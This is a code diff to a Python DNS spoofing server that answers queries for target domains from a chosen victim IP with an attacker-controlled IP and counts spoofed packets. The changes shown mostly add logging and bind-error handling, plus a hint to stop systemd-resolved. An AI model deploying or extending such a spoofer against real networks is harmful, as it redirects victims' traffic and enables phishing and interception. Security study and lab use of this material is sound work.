@@ -191,27 +191,42 @@ class DNSServer:
             try:
                 self.server_socket.bind(('0.0.0.0', self.listen_port))
                 self.logger.info(f"🚀 DNS server listening on 0.0.0.0:{self.listen_port}")
+            except OSError as e:
+                self.logger.error(f"❌ Cannot bind to port {self.listen_port}: {e}")
+                self.logger.error("Port 53 might be in use. Checking with: sudo lsof -i :53")
+                self.logger.error("To fix: sudo systemctl stop systemd-resolved")
+                self.is_running = False
+                return
             except PermissionError:
-                self.logger.error(f"❌ Cannot bind to port {self.listen_port} - need root!")
+                self.logger.error(f"❌ Permission denied - cannot bind to port {self.listen_port}")
                 self.logger.error("Run with: sudo python3 app.py")
                 self.is_running = False
                 return
             
             self.server_socket.settimeout(1.0)
+            self.logger.info("✅ DNS server socket ready and waiting for queries...")
             
             while self.is_running:
                 try:
                     # Receive DNS query
                     data, addr = self.server_socket.recvfrom(512)
+                    self.logger.debug(f"📨 Received {len(data)} bytes from {addr}")
                     
                     # Check victim IP if specified
                     if self.victim_ip and addr[0] != self.victim_ip:
+                        self.logger.debug(f"❌ Ignoring query from {addr[0]} (not victim {self.victim_ip})")
                         continue
                     
                     # Parse domain
                     domain, success = self._parse_dns_query(data)
                     
-                    if success and self._is_target_domain(domain):
+                    if not success:
+                        self.logger.debug(f"Failed to parse DNS query from {addr[0]}")
+                        continue
+                    
+                    self.logger.debug(f"🔍 Parsed domain: {domain}")
+                    
+                    if self._is_target_domain(domain):
                         # Create response
                         response = self._create_dns_response(data, domain)
                         
@@ -221,9 +236,13 @@ class DNSServer:
                             self.packets_spoofed += 1
                             
                             self.logger.info(
-                                f"🎯 SPOOFED: {addr[0]} asked for {domain} → "
+                                f"✅ SPOOFED: {addr[0]} asked for {domain} → "
                                 f"replied with {self.attacker_ip}"
                             )
+                        else:
+                            self.logger.error(f"Failed to create response for {domain}")
+                    else:
+                        self.logger.debug(f"Domain {domain} not in targets {self.target_domains}")
                 
                 except socket.timeout:
                     continue
